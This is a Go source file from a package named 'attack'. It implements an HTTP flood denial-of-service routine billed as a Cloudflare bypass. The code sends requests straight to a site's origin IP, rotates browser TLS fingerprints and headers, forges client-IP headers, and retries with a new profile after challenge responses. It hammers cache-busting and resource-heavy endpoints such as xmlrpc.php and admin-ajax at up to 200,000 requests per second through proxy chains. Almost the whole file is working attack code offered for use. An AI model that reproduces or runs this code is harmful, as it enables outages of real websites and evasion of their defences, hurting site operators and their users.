package attack

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Enhanced HTTP Flood with Cloudflare Bypass
func runHTTPFloodEnhanced(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	target := cfg.Target
	if cfg.OriginIP != "" {
		parsed, _ := url.Parse(target)
		target = fmt.Sprintf("%s://%s%s", parsed.Scheme, cfg.OriginIP, parsed.Path)
		if parsed.RawQuery != "" {
			target += "?" + parsed.RawQuery
		}
	}

	parsedTarget, err := url.Parse(target)
	if err != nil {
		log.Printf("Invalid target URL: %v", err)
		return
	}

	hostHeader := parsedTarget.Host
	if cfg.OriginIP != "" {
		origParsed, _ := url.Parse(cfg.Target)
		hostHeader = origParsed.Host
	}

	log.Printf("Enhanced HTTP Flood with Cloudflare Bypass: %s", target)

	smartEndpoints := []string{
		parsedTarget.Path,
		"/?s=", "/?p=", "/search?q=", "/?q=",
		"/wp-admin/admin-ajax.php?action=heartbeat",
		"/xmlrpc.php",
		"/?random=", "/page/", "/category/", "/tag/",
		"/api/v1/posts", "/api/v1/users", "/api/search",
		"/index.php?option=", "/index.php?id=",
	}
	if smartEndpoints[0] == "" || smartEndpoints[0] == "/" {
		smartEndpoints[0] = "/?_cb="
	}

	semCap := cfg.MaxConns
	if semCap > 50000 {
		semCap = 50000
	}
	sem := make(chan struct{}, semCap)

	workersPerSec := cfg.RPS
	if workersPerSec > 200000 {
		workersPerSec = 200000
	}

	rate := time.NewTicker(time.Second / time.Duration(workersPerSec))
	defer rate.Stop()

	var wg sync.WaitGroup
	parsedBase := parsedTarget.Scheme + "://" + parsedTarget.Host

	// Profile rotation counter
	profileIdx := uint64(0)

	doRequest := func(endpoint string) {
		defer wg.Done()
		defer func() { <-sem }()
		defer atomic.AddInt64(&metrics.InFlight, -1)
		defer func() {
			if r := recover(); r != nil {
				atomic.AddInt64(&metrics.Failed, 1)
			}
		}()

		atomic.AddInt64(&metrics.InFlight, 1)
		atomic.AddInt64(&metrics.TotalRequests, 1)

		// Rotate browser profile every 10 requests
		idx := atomic.AddUint64(&profileIdx, 1)
		profile := AllProfiles[idx%uint64(len(AllProfiles))]

		ts := time.Now().UnixNano()
		uniq := strconv.FormatInt(ts, 36) + strconv.FormatInt(rand63(), 36)
		separator := "?"
		if strings.Contains(endpoint, "?") {
			separator = "&"
		}
		reqURL := parsedBase + endpoint + separator + "_=" + uniq

		// Create custom transport with TLS fingerprinting
		tlsConfig := CreateTLSConfig(profile, parsedTarget.Hostname())
		
		dialContext := createDialerWithKeepAlive(cfg.ProxyChain,
			time.Duration(cfg.Timeout)*time.Second,
			time.Duration(cfg.KeepAlive)*time.Second)

		transport := &http.Transport{
			TLSClientConfig: tlsConfig,
			DialContext:     dialContext,
			MaxIdleConns:          100,
			MaxIdleConnsPerHost:   10,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			DisableKeepAlives:     false,
			DisableCompression:    false,
		}

		client := &http.Client{
			Transport: transport,
			Timeout:   time.Duration(cfg.Timeout) * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		// Smart retry with profile rotation
		var resp *http.Response
		maxRetries := 3
		
		for attempt := 0; attempt < maxRetries; attempt++ {
			req, err := http.NewRequest("GET", reqURL, nil)
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return
			}

			req.Host = hostHeader
			
			// Apply browser-specific headers
			ApplyBrowserHeaders(req, profile)
			
			// Additional bypass headers
			req.Header.Set("X-Forwarded-For", randomIP())
			req.Header.Set("X-Real-IP", randomIP())
			req.Header.Set("CF-Connecting-IP", randomFakeIP())
			req.Header.Set("X-Originating-IP", randomIP())
			req.Header.Set("X-Client-IP", randomIP())
			req.Header.Set("True-Client-IP", randomIP())
			req.Header.Set("X-Cluster-Client-IP", randomIP())
			req.Header.Set("Forwarded", fmt.Sprintf("for=%s;proto=https", randomIP()))

			// Execute request
			var reqErr error
			resp, reqErr = client.Do(req)

			if reqErr != nil {
				if strings.Contains(reqErr.Error(), "deadline") || strings.Contains(reqErr.Error(), "timeout") {
					atomic.AddInt64(&metrics.Timeout, 1)
				} else {
					atomic.AddInt64(&metrics.Failed, 1)
				}
				
				// Retry with backoff
				if attempt < maxRetries-1 {
					backoff := time.Duration(100*(1<<uint(attempt))) * time.Millisecond
					time.Sleep(backoff)
					
					// Switch profile for retry
					profile = AllProfiles[(idx+uint64(attempt+1))%uint64(len(AllProfiles))]
					continue
				}
				return
			}

			// Check response
			if resp.StatusCode == 403 || resp.StatusCode == 503 {
				// Cloudflare challenge detected
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				
				if attempt < maxRetries-1 {
					// Retry with different profile
					profile = AllProfiles[(idx+uint64(attempt+1))%uint64(len(AllProfiles))]
					backoff := time.Duration(200*(1<<uint(attempt))) * time.Millisecond
					time.Sleep(backoff)
					continue
				}
				
				atomic.AddInt64(&metrics.Failed, 1)
				return
			}

			// Success
			break
		}

		if resp == nil {
			atomic.AddInt64(&metrics.Failed, 1)
			return
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 500 || resp.StatusCode == 429 {
			atomic.AddInt64(&metrics.Completed, 1)
		} else {
			atomic.AddInt64(&metrics.Completed, 1)
		}

		transport.CloseIdleConnections()
	}

	endpointIdx := uint64(0)

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			break
		}

		select {
		case <-rate.C:
		}

		select {
		case sem <- struct{}{}:
			idx := atomic.AddUint64(&endpointIdx, 1)
			endpoint := smartEndpoints[idx%uint64(len(smartEndpoints))]
			wg.Add(1)
			go doRequest(endpoint)
		default:
		}
	}

	atomic.StoreInt32(&stopFlag, 1)

	waitDone := make(chan struct{})
	go func() {
		wg.Wait()
		close(waitDone)
	}()

	select {
	case <-waitDone:
	case <-time.After(time.Duration(cfg.Timeout+5) * time.Second):
		log.Printf("Drain timeout - %d requests still in flight", atomic.LoadInt64(&metrics.InFlight))
	}

	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}
